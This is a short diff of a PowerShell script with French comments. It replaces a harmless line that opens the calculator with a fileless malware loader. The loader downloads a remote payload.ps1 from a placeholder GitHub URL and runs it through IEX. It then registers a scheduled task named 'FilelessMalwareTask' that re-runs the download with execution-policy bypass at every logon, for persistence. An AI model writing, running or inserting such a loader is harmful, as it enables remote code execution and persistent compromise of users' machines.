@@ -1,4 +1,8 @@
-# Exemple simple : ouvrir la calculatrice
-Start-Process "calc.exe"
+# Télécharger et exécuter une charge utile
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/payload.ps1')
 
-# Ajoutez ici toute autre logique à exécuter
+# Ajouter une tâche planifiée pour persistance
+$TaskName = "FilelessMalwareTask"
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/payload.ps1')"
+$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
+Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $TaskName -Description "Executes a fileless script at logon"
